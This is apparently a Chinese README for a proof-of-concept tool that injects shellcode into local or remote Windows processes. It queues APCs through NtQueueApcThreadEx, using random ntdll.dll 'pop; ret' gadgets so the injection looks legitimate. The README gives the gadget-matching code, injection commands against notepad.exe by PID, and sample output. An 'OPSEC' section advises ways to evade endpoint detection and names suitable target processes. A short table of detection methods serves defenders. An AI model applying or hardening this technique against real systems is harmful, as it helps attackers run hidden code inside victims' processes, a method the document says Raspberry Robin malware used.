# NtQueueApcThreadEx NTDLL Gadget Injection - Gadget APC 注入

## 技术概述

NtQueueApcThreadEx NTDLL Gadget Injection 是一种新颖的 APC 注入技术，通过滥用 `NtQueueApcThreadEx` 的 `ApcRoutine` 参数，使其指向 ntdll.dll 中的 `pop r32; ret` gadget，从而实现高度隐蔽的代码注入。

## 核心原理

### 传统 APC 注入 vs Gadget APC 注入

| 特性 | 传统 QueueUserAPC | Gadget APC Injection |
|------|-------------------|----------------------|
| **ApcRoutine** | 直接指向 shellcode（可疑） | 指向 ntdll.dll 中的 gadget（合法） |
| **检测难度** | 容易（ApcRoutine 在异常内存） | 困难（ApcRoutine 在 ntdll.dll） |
| **Gadget 数量** | N/A | 数百个（随机选择） |
| **隐蔽性** | 中等 | 极高 |

### 完整流程

```
1. Gadget 搜索
   ├─ 解析 ntdll.dll PE 头
   ├─ 遍历可执行节（.text）
   ├─ 搜索模式：5X C3（pop r32; ret），排除 5C（pop esp）
   ├─ 收集所有 gadget
   └─ 随机选择一个

2. NtQueueApcThreadEx 调用
   ├─ ApcRoutine = gadget 地址（ntdll.dll 中的合法地址）
   ├─ SystemArgument1 = shellcode 地址
   ├─ SystemArgument2 = NULL
   └─ SystemArgument3 = NULL

3. 执行流程
   ├─ 线程进入 alertable 状态（NtTestAlert / WaitForSingleObjectEx）
   ├─ APC 被调度，跳转到 ApcRoutine（gadget）
   ├─ 执行 pop r32（弹出栈上的某个参数）
   ├─ 执行 ret（返回到 SystemArgument1 = shellcode）
   └─ Shellcode 执行
```

## Gadget 模式匹配

### 模式：`pop r32; ret`

```asm
5X C3    ; pop r32; ret
```

### 字节模式

- **第一个字节**：`5X`（pop r32）
  - `50` = pop eax/rax
  - `51` = pop ecx/rcx
  - `52` = pop edx/rdx
  - `53` = pop ebx/rbx
  - `54` = pop esp/rsp（❌ 排除）
  - `55` = pop ebp/rbp
  - `56` = pop esi/rsi
  - `57` = pop edi/rdi
  - `58-5F` = pop r8-r15 (x64)

- **第二个字节**：`C3`（ret）

### 匹配逻辑

```c
BOOL IsValidGadget(PBYTE address) {
    // (*address & 0xF0) == 0x50: 检查高 4 位是否为 5
    // *address != 0x5C: 排除 pop esp（会破坏栈）
    // *(address + 1) == 0xC3: 检查下一个字节是否为 ret
    return (*address != 0x5C && (*address & 0xF0) == 0x50) && *(address + 1) == 0xC3;
}
```

## 执行流程图

```
NtQueueApcThreadEx(
    hThread,
    NULL,
    ntdll!<pop r32; ret>,  ← ApcRoutine（合法地址）
    shellcode,             ← SystemArgument1
    NULL,
    NULL
)
    ↓
NtTestAlert() / WaitForSingleObjectEx()
    ↓
线程进入 alertable 状态
    ↓
APC 调度
    ↓
跳转到 ApcRoutine (ntdll!<pop r32; ret>)
    ↓
执行 pop r32（弹出栈上的参数）
    ↓
执行 ret（返回到 SystemArgument1）
    ↓
Shellcode 执行 ✨
```

## 编译与使用

### Windows (build.bat)

```batch
build.bat
```

### Linux/Git Bash (build.sh)

```bash
chmod +x build.sh
./build.sh
```

### 生成 Shellcode

```cmd
cd build

# 生成 calc.exe shellcode
generate_shellcode.exe calc

# 生成 messagebox shellcode
generate_shellcode.exe messagebox

# 生成所有 shellcode
generate_shellcode.exe all
```

### 运行注入

#### 本地注入（自身进程）

```cmd
# 语法
gadget_apc_injection.exe local <shellcode.bin>

# 示例
gadget_apc_injection.exe local calc_shellcode.bin
```

**输出示例**：
```
[+] NtQueueApcThreadEx NTDLL Gadget Injection
[+] LloydLabs Technique

[+] Loaded shellcode: 276 bytes

[+] Local Gadget APC Injection
[+] Shellcode address: 0000000000A50000
[+] Shellcode size: 276 bytes

[+] NtQueueApcThreadEx: 00007FFE8C5F1234
[+] NtTestAlert: 00007FFE8C5F5678

[+] Module ntdll.dll base address: 00007FFE8C5D0000
[+] Module size: 2097152 bytes
[+] Searching for gadgets in executable sections...
[+] Scanning section: .text
[+] Found 1247 gadgets
[+] Selected random gadget at ntdll.dll!00007FFE8C6A2B3C (index 537/1247)
[+] Gadget bytes: 52 C3 (pop edx/rdx; ret)

[+] Queueing APC with gadget...
[+] ApcRoutine = 00007FFE8C6A2B3C (ntdll.dll gadget)
[+] SystemArgument1 = 0000000000A50000 (shellcode)

[+] NtQueueApcThreadEx succeeded
[+] Calling NtTestAlert to trigger APC...

[+] Local injection successful!
```

#### 远程注入（目标进程）

```cmd
# 语法
gadget_apc_injection.exe remote <PID> <shellcode.bin>

# 示例：注入到 notepad.exe
start notepad
gadget_apc_injection.exe remote 5678 calc_shellcode.bin
```

**输出示例**：
```
[+] Remote Gadget APC Injection
[+] Target PID: 5678
[+] Shellcode size: 276 bytes

[+] Opened target process
[+] Allocated remote memory at 0000000002D40000
[+] Wrote shellcode to remote process
[+] Module ntdll.dll base address: 00007FFE8C5D0000
[+] Module size: 2097152 bytes
[+] Searching for gadgets in executable sections...
[+] Scanning section: .text
[+] Found 1247 gadgets
[+] Selected random gadget at ntdll.dll!00007FFE8C6C1F8A (index 892/1247)
[+] Gadget bytes: 53 C3 (pop ebx/rbx; ret)

[+] Enumerating threads...
[+] Queueing APC to thread 1234
[+] Queueing APC to thread 5678

[+] Queued APCs to 2 threads
[+] Waiting for thread to enter alertable state...
[+] Remote injection successful!
```

## 触发 APC 执行

### 本地注入

调用 `NtTestAlert()` 立即触发 APC

### 远程注入

需要目标进程的线程进入 alertable 状态：

1. **调用 alertable 函数**：
   - `SleepEx(0, TRUE)`
   - `WaitForSingleObjectEx(hEvent, INFINITE, TRUE)`
   - `MsgWaitForMultipleObjectsEx()`

2. **常见触发时机**：
   - GUI 应用：消息循环（GetMessage / PeekMessage）
   - 网络应用：Socket 操作（WSARecv / WSASend）
   - I/O 操作：异步文件操作

3. **推荐目标进程**：
   - **notepad.exe** - GUI 应用，频繁进入 alertable
   - **explorer.exe** - Windows 资源管理器
   - 任何 GUI 应用

## OPSEC 改进建议

⚠️ **这是 POC，不可直接用于生产环境！**

### 必须修改的部分

1. **内存保护**
   - ❌ 当前使用 PAGE_EXECUTE_READWRITE
   - ✅ 改为 PAGE_READWRITE → PAGE_EXECUTE_READ

2. **Shellcode 存储**
   - ❌ 明文存储
   - ✅ 使用 [shellcode-plain-sight](https://github.com/LloydLabs/shellcode-plain-sight) 项目

3. **Gadget 选择**
   - ✅ 已实现随机选择
   - ✅ 可增加模块多样性（不仅限于 ntdll.dll）

4. **API 调用**
   - ❌ 直接调用 NtQueueApcThreadEx
   - ✅ 使用 Indirect Syscalls

## 防御检测方法

| 检测层面 | 方法 |
|---------|------|
| **APC 监控** | Hook NtQueueApcThreadEx，检查 SystemArgument1 是否指向可执行内存 |
| **ApcRoutine 验证** | 检查 ApcRoutine 是否指向 ntdll.dll 内部（可能误报） |
| **内存扫描** | 扫描可执行内存中的 shellcode 特征 |
| **行为分析** | 监控异常的 APC 调用模式 |
| **线程监控** | 检测线程频繁进入 alertable 状态 |

## 技术特点

| 特性 | 描述 |
|-----|------|
| ✅ 极高隐蔽性 | ApcRoutine 指向 ntdll.dll 合法地址 |
| ✅ 随机化 | 从数百个 gadget 中随机选择 |
| ✅ ROP 风格 | 利用现有代码片段（gadget） |
| ✅ 无新内存分配（本地） | Shellcode 在正常分配的内存中 |
| ⚠️ 依赖 alertable 状态 | 远程注入需要线程进入 alertable 状态 |
| ⚠️ Windows 7+ | 需要 NtQueueApcThreadEx API |

## 技术来源

- **原作者**: LloydLabs
- **原仓库**: [LloydLabs/ntqueueapcthreadex-ntdll-gadget-injection](https://github.com/LloydLabs/ntqueueapcthreadex-ntdll-gadget-injection)
- **首次使用**: Raspberry Robin 恶意软件
- **分析报告**: [Avast - Raspberry Robin's Roshtyak](https://decoded.avast.io/janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/)

## 致谢

- [LloydLabs](https://github.com/LloydLabs) - 技术发现和实现
- [Avast](https://decoded.avast.io/) - Raspberry Robin 分析报告

## 参考链接

- [LloydLabs Repository](https://github.com/LloydLabs/ntqueueapcthreadex-ntdll-gadget-injection)
- [Avast Research - Raspberry Robin](https://decoded.avast.io/janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/)
- [Shellcode Plain Sight](https://github.com/LloydLabs/shellcode-plain-sight)
